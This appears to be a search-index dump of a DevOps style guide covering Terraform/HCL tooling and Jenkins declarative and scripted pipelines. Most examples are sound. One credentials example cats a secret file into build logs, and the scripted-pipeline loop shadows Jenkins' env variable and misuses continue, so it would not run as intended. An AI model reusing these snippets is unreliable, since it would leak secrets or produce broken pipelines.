443\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n\n## Good - Dynamic block\nlocals {\n  ingress_rules = [\n    { port = 80, protocol = \"tcp\" },\n    { port = 443, protocol = \"tcp\" }\n  ]\n}\n\nresource \"aws_security_group\" \"web\" {\n  dynamic \"ingress\" {\n    for_each = local.ingress_rules\n    content {\n      from_port   = ingress.value.port\n      to_port     = ingress.value.port\n      protocol    = ingress.value.protocol\n      cidr_blocks = [\"0.0.0.0/0\"]\n    }\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-not-validating-variables","title":"\u274c Avoid: Not Validating Variables","text":"<pre><code>## Bad - No validation\nvariable \"environment\" {\n  type = string\n}\n\n## Good - With validation\nvariable \"environment\" {\n  type = string\n  validation {\n    condition     = contains([\"dev\", \"staging\", \"prod\"], var.environment)\n    error_message = \"Environment must be dev, staging, or prod.\"\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#tool-configuration","title":"Tool Configuration","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#terraform-fmt","title":"Terraform fmt","text":"<p>Terraform includes a built-in formatter that follows HCL style conventions:</p> <pre><code>## Format all HCL files in current directory\nterraform fmt\n\n## Format specific directory\nterraform fmt modules/networking\n\n## Check formatting without making changes\nterraform fmt -check\n\n## Recursive formatting\nterraform fmt -recursive\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#terraformrc-configuration","title":"terraform.rc Configuration","text":"<p>Configure Terraform CLI behavior:</p> <pre><code>## ~/.terraformrc or terraform.rc\nplugin_cache_dir   = \"$HOME/.terraform.d/plugin-cache\"\ndisable_checkpoint = true\n\ncredentials \"app.terraform.io\" {\n  token = \"xxxxxx.atlasv1.zzzzzzzzzzzzz\"\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#project-tflint-configuration","title":"Project tflint Configuration","text":"<pre><code>## .tflint.hcl\nconfig {\n  module = true\n  force = false\n}\n\nplugin \"terraform\" {\n  enabled = true\n  preset  = \"recommended\"\n}\n\nplugin \"aws\" {\n  enabled = true\n  version = \"0.31.0\"\n  source  = \"github.com/terraform-linters/tflint-ruleset-aws\"\n}\n\nrule \"terraform_naming_convention\" {\n  enabled = true\n}\n\nrule \"terraform_typed_variables\" {\n  enabled = true\n}\n\nrule \"terraform_required_version\" {\n  enabled = true\n}\n\nrule \"terraform_required_providers\" {\n  enabled = true\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#editorconfig-for-hcl","title":"EditorConfig for HCL","text":"<pre><code>## .editorconfig\n[*.{tf,hcl}]\nindent_style = space\nindent_size = 2\nend_of_line = lf\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.88.4\n    hooks:\n      - id: terraform_fmt\n        args:\n          - --args=-diff\n          - --args=-write=true\n\n      - id: terraform_validate\n        args:\n          - --hook-config=--retry-once-with-cleanup=true\n\n      - id: terraform_tflint\n        args:\n          - --args=--config=__GIT_WORKING_DIR__/.tflint.hcl\n\n      - id: terraform_docs\n        args:\n          - --hook-config=--path-to-file=README.md\n          - --hook-config=--add-to-existing-file=true\n          - --hook-config=--create-file-if-not-exist=true\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#vs-code-settings","title":"VS Code Settings","text":"<pre><code>{\n  \"[terraform]\": {\n    \"editor.defaultFormatter\": \"hashicorp.terraform\",\n    \"editor.formatOnSave\": true,\n    \"editor.formatOnSaveMode\": \"file\"\n  },\n  \"[terraform-vars]\": {\n    \"editor.defaultFormatter\": \"hashicorp.terraform\",\n    \"editor.formatOnSave\": true\n  },\n  \"terraform.languageServer.enable\": true,\n  \"terraform.validation.enableEnhancedValidation\": true\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#makefile-integration","title":"Makefile Integration","text":"<pre><code>## Makefile\n.PHONY: fmt validate lint\n\nfmt:\n terraform fmt -recursive\n\nvalidate:\n terraform init -backend=false\n terraform validate\n\nlint:\n tflint --init\n tflint --recursive\n\ncheck: fmt validate lint\n @echo \"All checks passed!\"\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#resources","title":"Resources","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#official-documentation","title":"Official Documentation","text":"<ul> <li>HCL Syntax Documentation</li> <li>Terraform Language Documentation</li> <li>HCL GitHub Repository</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#style-guides","title":"Style Guides","text":"<ul> <li>Terraform Best Practices</li> <li>HCL Style Guide</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/jenkins_groovy/","title":"Jenkins & Groovy Style Guide","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#language-overview","title":"Language Overview","text":"<p>Jenkins is an open-source automation server that enables CI/CD pipelines. Groovy is a JVM language used to define Jenkins pipelines. This guide focuses on Jenkins Pipeline (as code) using declarative and scripted syntax.</p>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Declarative (preferred) and Scripted (for complex logic)</li> <li>File Name: <code>Jenkinsfile</code></li> <li>Primary Use: Continuous integration, continuous delivery, infrastructure automation</li> <li>Jenkins Version: Jenkins 2.x+ with Pipeline plugin</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#pipeline-types","title":"Pipeline Types","text":"<ul> <li>Declarative Pipeline: Simplified, structured syntax (preferred for most use cases)</li> <li>Scripted Pipeline: Full Groovy power for complex workflows</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes File Naming Pipeline File <code>Jenkinsfile</code> <code>Jenkinsfile</code> At repository root Shared Library <code>vars/functionName.groovy</code> <code>vars/buildDocker.groovy</code> Shared pipeline functions Declarative Pipeline <code>pipeline</code> Top-level block <code>pipeline { }</code> Required wrapper <code>agent</code> Execution environment <code>agent any</code> or <code>agent { docker }</code> Where to run <code>stages</code> Pipeline phases <code>stages { }</code> Container for stages <code>stage</code> Individual phase <code>stage('Build') { }</code> Named pipeline stage <code>steps</code> Actual commands <code>steps { sh 'make' }</code> Commands to execute <code>post</code> Post-build actions <code>post { always { } }</code> Cleanup, notifications Scripted Pipeline <code>node</code> Execution block <code>node { }</code> Where pipeline runs <code>stage</code> Pipeline stage <code>stage('Build') { }</code> Same as declarative Variables Environment <code>environment { }</code> <code>environment { FOO = 'bar' }</code> Environment variables Parameters <code>parameters { }</code> <code>string(name: 'VERSION')</code> Build parameters Common Steps Shell <code>sh</code> <code>sh 'make build'</code> Execute shell commands Git <code>git</code> <code>git 'https://repo.git'</code> Checkout code Docker <code>docker.build</code> <code>docker.build('image:tag')</code> Build Docker images Archive <code>archiveArtifacts</code> <code>archiveArtifacts '*.jar'</code> Save build artifacts Best Practices Declarative Prefer declarative Simpler, more maintainable Use scripted only when needed Shared Libraries DRY code Reusable pipeline functions Avoid duplication Credentials Use credentials() Never hardcode secrets Secure credential management Parallel Use parallel {} Speed up builds Run stages concurrently","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#declarative-pipeline-structure","title":"Declarative Pipeline Structure","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#basic-declarative-pipeline","title":"Basic Declarative Pipeline","text":"<pre><code>pipeline {\n    agent any\n\n    options {\n        buildDiscarder(logRotator(numToKeepStr: '10'))\n        timestamps()\n        timeout(time: 30, unit: 'MINUTES')\n    }\n\n    environment {\n        APP_NAME = 'my-application'\n        BUILD_VERSION = \"${env.BUILD_NUMBER}\"\n    }\n\n    stages {\n        stage('Build') {\n            steps {\n                echo \"Building ${APP_NAME} version ${BUILD_VERSION}\"\n                sh 'make build'\n            }\n        }\n\n        stage('Test') {\n            steps {\n                sh 'make test'\n            }\n        }\n\n        stage('Deploy') {\n            steps {\n                sh 'make deploy'\n            }\n        }\n    }\n\n    post {\n        always {\n            cleanWs()\n        }\n        success {\n            echo 'Pipeline succeeded!'\n        }\n        failure {\n            echo 'Pipeline failed!'\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#agent-configuration","title":"Agent Configuration","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#agent-types","title":"Agent Types","text":"<pre><code>pipeline {\n    // Run on any available agent\n    agent any\n}\n\npipeline {\n    // Run on agent with specific label\n    agent {\n        label 'linux-docker'\n    }\n}\n\npipeline {\n    // Run in Docker container\n    agent {\n        docker {\n            image 'node:18-alpine'\n            args '-v /tmp:/tmp'\n        }\n    }\n}\n\npipeline {\n    // Run on Kubernetes pod\n    agent {\n        kubernetes {\n            yaml \"\"\"\napiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: maven\n    image: maven:3.8-jdk-11\n    command: ['cat']\n    tty: true\n\"\"\"\n        }\n    }\n}\n\npipeline {\n    // No global agent, define per-stage\n    agent none\n\n    stages {\n        stage('Build') {\n            agent { label 'linux' }\n            steps {\n                sh 'make build'\n            }\n        }\n\n        stage('Deploy') {\n            agent { label 'production' }\n            steps {\n                sh 'make deploy'\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#stages-and-steps","title":"Stages and Steps","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#stage-naming-conventions","title":"Stage Naming Conventions","text":"<p>Use Title Case for stage names:</p> <pre><code>stages {\n    stage('Checkout Code') { }\n    stage('Build Application') { }\n    stage('Run Unit Tests') { }\n    stage('Run Integration Tests') { }\n    stage('Build Docker Image') { }\n    stage('Push to Registry') { }\n    stage('Deploy to Development') { }\n    stage('Deploy to Staging') { }\n    stage('Deploy to Production') { }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#conditional-stages","title":"Conditional Stages","text":"<pre><code>stages {\n    stage('Deploy to Production') {\n        when {\n            branch 'main'\n        }\n        steps {\n            sh 'make deploy-prod'\n        }\n    }\n\n    stage('Deploy to Staging') {\n        when {\n            not {\n                branch 'main'\n            }\n        }\n        steps {\n            sh 'make deploy-staging'\n        }\n    }\n\n    stage('Tag Release') {\n        when {\n            tag pattern: 'v\\\\d+\\\\.\\\\d+\\\\.\\\\d+', comparator: 'REGEXP'\n        }\n        steps {\n            echo \"Releasing version ${env.TAG_NAME}\"\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#environment-variables","title":"Environment Variables","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#global-and-stage-specific-variables","title":"Global and Stage-Specific Variables","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        // Global environment variables\n        DOCKER_REGISTRY = 'registry.example.com'\n        APP_NAME = 'my-app'\n        SLACK_CHANNEL = '#builds'\n    }\n\n    stages {\n        stage('Build') {\n            environment {\n                // Stage-specific environment variables\n                BUILD_TYPE = 'release'\n            }\n            steps {\n                sh \"docker build -t ${DOCKER_REGISTRY}/${APP_NAME}:${env.BUILD_NUMBER} .\"\n            }\n        }\n\n        stage('Deploy') {\n            environment {\n                DEPLOY_ENV = \"${env.BRANCH_NAME == 'main' ? 'production' : 'staging'}\"\n            }\n            steps {\n                echo \"Deploying to ${DEPLOY_ENV}\"\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#built-in-environment-variables","title":"Built-in Environment Variables","text":"<pre><code>// Common Jenkins environment variables\n${env.BUILD_NUMBER}      // Build number\n${env.BUILD_ID}          // Build ID (same as BUILD_NUMBER)\n${env.JOB_NAME}          // Job name\n${env.WORKSPACE}         // Workspace directory\n${env.BRANCH_NAME}       // Git branch name\n${env.GIT_COMMIT}        // Git commit SHA\n${env.GIT_URL}           // Git repository URL\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#parameters-and-triggers","title":"Parameters and Triggers","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#pipeline-parameters","title":"Pipeline Parameters","text":"<pre><code>pipeline {\n    agent any\n\n    parameters {\n        string(\n            name: 'DEPLOY_ENV',\n            defaultValue: 'staging',\n            description: 'Deployment environment'\n        )\n        choice(\n            name: 'BUILD_TYPE',\n            choices: ['debug', 'release'],\n            description: 'Build type'\n        )\n        booleanParam(\n            name: 'RUN_TESTS',\n            defaultValue: true,\n            description: 'Run tests before deployment'\n        )\n        text(\n            name: 'RELEASE_NOTES',\n            defaultValue: '',\n            description: 'Release notes for this deployment'\n        )\n    }\n\n    stages {\n        stage('Deploy') {\n            steps {\n                echo \"Deploying to ${params.DEPLOY_ENV}\"\n                echo \"Build type: ${params.BUILD_TYPE}\"\n                echo \"Run tests: ${params.RUN_TESTS}\"\n                echo \"Release notes: ${params.RELEASE_NOTES}\"\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#pipeline-triggers","title":"Pipeline Triggers","text":"<pre><code>pipeline {\n    agent any\n\n    triggers {\n        // Poll SCM every 5 minutes\n        pollSCM('H/5 * * * *')\n\n        // Run at midnight daily\n        cron('0 0 * * *')\n\n        // Trigger on upstream job completion\n        upstream(\n            upstreamProjects: 'upstream-job-name',\n            threshold: hudson.model.Result.SUCCESS\n        )\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#credentials-management","title":"Credentials Management","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#using-credentials","title":"Using Credentials","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        // Username/password credential\n        DOCKER_CREDS = credentials('docker-hub-credentials')\n    }\n\n    stages {\n        stage('Login to Docker') {\n            steps {\n                sh 'echo $DOCKER_CREDS_PSW | docker login -u $DOCKER_CREDS_USR --password-stdin'\n            }\n        }\n\n        stage('Use Secret File') {\n            steps {\n                withCredentials([file(credentialsId: 'secret-config', variable: 'CONFIG_FILE')]) {\n                    sh 'cat $CONFIG_FILE'\n                }\n            }\n        }\n\n        stage('Use SSH Key') {\n            steps {\n                withCredentials([sshUserPrivateKey(\n                    credentialsId: 'ssh-key-id',\n                    keyFileVariable: 'SSH_KEY',\n                    usernameVariable: 'SSH_USER'\n                )]) {\n                    sh 'ssh -i $SSH_KEY $SSH_USER@server.example.com \"ls -la\"'\n                }\n            }\n        }\n\n        stage('Use AWS Credentials') {\n            steps {\n                withCredentials([aws(credentialsId: 'aws-credentials')]) {\n                    sh 'aws s3 ls'\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#shared-libraries","title":"Shared Libraries","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#using-shared-libraries","title":"Using Shared Libraries","text":"<pre><code>// At the top of Jenkinsfile\n@Library('my-shared-library@main') _\n\npipeline {\n    agent any\n\n    stages {\n        stage('Build') {\n            steps {\n                // Call shared library function\n                buildDockerImage(\n                    imageName: 'my-app',\n                    tag: env.BUILD_NUMBER\n                )\n            }\n        }\n\n        stage('Deploy') {\n            steps {\n                deployToKubernetes(\n                    namespace: 'production',\n                    deployment: 'my-app'\n                )\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#creating-shared-library-functions","title":"Creating Shared Library Functions","text":"<pre><code>// vars/buildDockerImage.groovy\ndef call(Map config) {\n    def imageName = config.imageName\n    def tag = config.tag\n    def registry = config.registry ?: 'docker.io'\n\n    sh \"\"\"\n        docker build -t ${registry}/${imageName}:${tag} .\n        docker push ${registry}/${imageName}:${tag}\n    \"\"\"\n}\n\n// vars/sendSlackNotification.groovy\ndef call(String channel, String message, String color = 'good') {\n    slackSend(\n        channel: channel,\n        message: message,\n        color: color\n    )\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#post-actions","title":"Post Actions","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#post-block-types","title":"Post Block Types","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n        }\n    }\n\n    post {\n        always {\n            // Always runs, regardless of build result\n            echo 'Pipeline completed'\n            cleanWs()\n        }\n\n        success {\n            // Runs only if build succeeds\n            echo 'Build succeeded!'\n            slackSend channel: '#builds', message: \"Build ${env.BUILD_NUMBER} succeeded\"\n        }\n\n        failure {\n            // Runs only if build fails\n            echo 'Build failed!'\n            slackSend channel: '#builds', message: \"Build ${env.BUILD_NUMBER} failed\", color: 'danger'\n        }\n\n        unstable {\n            // Runs if build is unstable (tests failed but build succeeded)\n            echo 'Build is unstable'\n        }\n\n        changed {\n            // Runs if build status changed from previous build\n            echo 'Build status changed'\n        }\n\n        fixed {\n            // Runs if build was broken and is now fixed\n            echo 'Build is fixed!'\n        }\n\n        regression {\n            // Runs if build was successful and is now unstable/failed\n            echo 'Build regressed'\n        }\n\n        cleanup {\n            // Always runs after all other post conditions\n            echo 'Final cleanup'\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#parallel-execution","title":"Parallel Execution","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#parallel-stages","title":"Parallel Stages","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Tests') {\n            parallel {\n                stage('Unit Tests') {\n                    steps {\n                        sh 'make test-unit'\n                    }\n                }\n\n                stage('Integration Tests') {\n                    steps {\n                        sh 'make test-integration'\n                    }\n                }\n\n                stage('E2E Tests') {\n                    steps {\n                        sh 'make test-e2e'\n                    }\n                }\n            }\n        }\n\n        stage('Multi-Platform Build') {\n            parallel {\n                stage('Build AMD64') {\n                    agent { label 'amd64' }\n                    steps {\n                        sh 'docker build --platform linux/amd64 -t app:amd64 .'\n                    }\n                }\n\n                stage('Build ARM64') {\n                    agent { label 'arm64' }\n                    steps {\n                        sh 'docker build --platform linux/arm64 -t app:arm64 .'\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#scripted-pipeline","title":"Scripted Pipeline","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#when-to-use-scripted-pipeline","title":"When to Use Scripted Pipeline","text":"<p>Use scripted pipelines for:</p> <ul> <li>Complex conditional logic</li> <li>Dynamic stage generation</li> <li>Advanced error handling</li> <li>Integration with custom Groovy code</li> </ul> <pre><code>node('linux') {\n    def deployEnv = 'staging'\n\n    try {\n        stage('Checkout') {\n            checkout scm\n        }\n\n        stage('Build') {\n            sh 'make build'\n        }\n\n        stage('Test') {\n            try {\n                sh 'make test'\n            } catch (Exception e) {\n                echo \"Tests failed: ${e.message}\"\n                currentBuild.result = 'UNSTABLE'\n            }\n        }\n\n        // Dynamic stage generation\n        def environments = ['dev', 'staging', 'prod']\n        for (env in environments) {\n            stage(\"Deploy to ${env}\") {\n                if (env == 'prod' &amp;&amp; env.BRANCH_NAME != 'main') {\n                    echo \"Skipping production deployment for non-main branch\"\n                    continue\n                }\n                sh \"make deploy-${env}\"\n            }\n        }\n    } catch (Exception e) {\n        currentBuild.result = 'FAILURE'\n        throw e\n    } finally {\n        stage('Cleanup') {\n            cleanWs()\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#error-handling","title":"Error Handling","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#try-catch-in-declarative-pipeline","title":"Try-Catch in Declarative Pipeline","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Build') {\n            steps {\n                script {\n                    try {\n                        sh 'make build'\n                    } catch (Exception e) {\n                        echo \"Build failed: ${e.message}\"\n                        error(\"Build step failed\")\n                    }\n                }\n            }\n        }\n\n        stage('Test with Retry') {\n            steps {\n                retry(3) {\n                    sh 'make test'\n                }\n            }\n        }\n\n        stage('Test with Timeout') {\n            steps {\n                timeout(time: 10, unit: 'MINUTES') {\n                    sh 'make test'\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#testing","title":"Testing","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#testing-pipelines-with-jenkins-pipeline-unit","title":"Testing Pipelines with Jenkins Pipeline Unit","text":"<p>Use Jenkins Pipeline Unit to test Groovy pipelines:</p> <pre><code>## build.gradle\ndependencies {\n    testImplementation 'com.lesfurets:jenkins-pipeline-unit:1.19'\n    testImplementation 'junit:junit:4.13.2'\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#unit-test-example","title":"Unit Test Example","text":"<pre><code>## test/groovy/TestJenkinsfile.groovy\nimport com.lesfurets.jenkins.unit.BasePipelineTest\nimport org.junit.Before\nimport org.junit.Test\n\nclass TestJenkinsfile extends BasePipelineTest {\n\n    @Override\n    @Before\n    void setUp() {\n        super.setUp()\n\n        // Mock pipeline steps\n        helper.registerAllowedMethod('sh', [String.class], { String cmd -&gt;\n            return \"mocked output\"\n        })\n\n        helper.registerAllowedMethod('checkout', [Map.class], null)\n        helper.registerAllowedMethod('junit', [String.class], null)\n    }\n\n    @Test\n    void testPipelineSuccess() {\n        def script = loadScript('Jenkinsfile')\n        script.execute()\n\n        printCallStack()\n\n        // Verify expected steps were called\n        assertJobStatusSuccess()\n    }\n\n    @Test\n    void testBuildStage() {\n        def script = loadScript('Jenkinsfile')\n\n        binding.setVariable('env', [BRANCH_NAME: 'main'])\n\n        script.execute()\n\n        // Verify build commands\n        assertTrue(helper.callStack.findAll {\n            it.methodName == 'sh'\n        }.any {\n            it.args[0].toString().contains('npm run build')\n        })\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#testing-shared-libraries","title":"Testing Shared Libraries","text":"<pre><code>## vars/deployApp.groovy\ndef call(Map config) {\n    pipeline {\n        agent any\n        stages {\n            stage('Deploy') {\n                steps {\n                    script {\n                        sh \"kubectl apply -f ${config.manifestPath}\"\n                    }\n                }\n            }\n        }\n    }\n}\n\n## test/groovy/DeployAppTest.groovy\nimport com.lesfurets.jenkins.unit.BasePipelineTest\nimport org.junit.Test\n\nclass DeployAppTest extends BasePipelineTest {\n\n    @Test\n    void testDeployAppCall() {\n        def script = loadScript('vars/deployApp.groovy')\n\n        helper.registerAllowedMethod('sh', [String.class], { cmd -&gt;\n            assert cmd.contains('kubectl apply')\n        })\n\n        script.call([manifestPath: '/path/to/manifest.yaml'])\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#linting-with-npm-groovy-lint","title":"Linting with npm-groovy-lint","text":"<pre><code>## Install npm-groovy-lint\nnpm install -g npm-groovy-lint\n\n## Lint Jenkinsfile\nnpm-groovy-lint Jenkinsfile\n\n## Lint with auto-fix\nnpm-groovy-lint --fix Jenkinsfile\n\n## Lint all Groovy files\nnpm-groovy-lint \"**/*.groovy\"\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#configuration-for-npm-groovy-lint","title":"Configuration for npm-groovy-lint","text":"<pre><code>## .groovylintrc.json\n{\n  \"extends\": \"recommended\",\n  \"rules\": {\n    \"CompileStatic\": \"off\",\n    \"DuplicateStringLiteral\": \"warning\",\n    \"LineLength\": {\n      \"length\": 120\n    },\n    \"MethodSize\": {\n      \"maxLines\": 50\n    }\n  }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#validating-jenkinsfile-syntax","title":"Validating Jenkinsfile Syntax","text":"<pre><code>## Using Jenkins CLI\njava -jar jenkins-cli.jar -s http://jenkins:8080/ \\\n    declarative-linter &lt; Jenkinsfile\n\n## Using curl with Jenkins API\ncurl -X POST -F \"jenkinsfile=&lt;Jenkinsfile\" \\\n    http://jenkins:8080/pipeline-model-converter/validate\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#integration-testing","title":"Integration Testing","text":"<p>Test pipeline integration in actual Jenkins:</p> <pre><code>## tests/integration/Jenkinsfile.test\n@Library('shared-library@main') _\n\npipeline {\n    agent any\n\n    options {\n        skipDefaultCheckout()\n    }\n\n    stages {\n        stage('Test Pipeline Integration') {\n            steps {\n                script {\n                    // Test shared library functions\n                    def result = deployApp([\n                        environment: 'test',\n                        version: '1.0.0'\n                    ])\n\n                    assert result.status == 'success'\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#cicd-for-pipeline-testing","title":"CI/CD for Pipeline Testing","text":"<pre><code>## Jenkinsfile.test\npipeline {\n    agent any\n\n    stages {\n        stage('Lint') {\n            steps {\n                sh 'npm-groovy-lint Jenkinsfile'\n            }\n        }\n\n        stage('Unit Tests') {\n            steps {\n                sh './gradlew test'\n            }\n        }\n\n        stage('Validate Syntax') {\n            steps {\n                sh '''\n                    curl -X POST -F \"jenkinsfile=&lt;Jenkinsfile\" \\\n                        http://localhost:8080/pipeline-model-converter/validate\n                '''\n            }\n        }\n    }\n\n    post {\n        always {\n            junit 'build/test-results/**/*.xml'\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#testing-with-different-agents","title":"Testing with Different Agents","text":"<pre><code>def testOnAgent(String agentLabel, Closure testClosure) {\n    node(agentLabel) {\n        try {\n            testClosure()\n            echo \"Tests passed on ${agentLabel}\"\n        } catch (Exception e) {\n            error \"Tests failed on ${agentLabel}: ${e.message}\"\n        }\n    }\n}\n\n// Usage in pipeline\npipeline {\n    agent none\n\n    stages {\n        stage('Cross-Platform Tests') {\n            parallel {\n                stage('Linux') {\n                    steps {\n                        script {\n                            testOnAgent('linux') {\n                                sh 'make test'\n                            }\n                        }\n                    }\n                }\n\n                stage('Windows') {\n                    steps {\n                        script {\n                            testOnAgent('windows') {\n                                bat 'nmake test'\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#mock-external-dependencies","title":"Mock External Dependencies","text":"<pre><code>## Test with mocked HTTP calls\n@Test\nvoid testAPICall() {\n    helper.registerAllowedMethod('httpRequest', [Map.class], { Map args -&gt;\n        return [\n            status: 200,\n            content: '{\"success\": true}'\n        ]\n    })\n\n    def script = loadScript('Jenkinsfile')\n    script.execute()\n\n    assertJobStatusSuccess()\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#performance-testing","title":"Performance Testing","text":"<p>Test pipeline performance:</p> <pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Performance Test') {\n            steps {\n                script {\n                    def startTime = System.currentTimeMillis()\n\n                    // Run pipeline stages\n                    sh 'npm run build'\n                    sh 'npm test'\n\n                    def duration = System.currentTimeMillis() - startTime\n\n                    echo \"Pipeline took ${duration}ms\"\n\n                    if (duration &gt; 600000) { // 10 minutes\n                        error \"Pipeline exceeds time threshold\"\n                    }\n                }\n            }\n        }\n    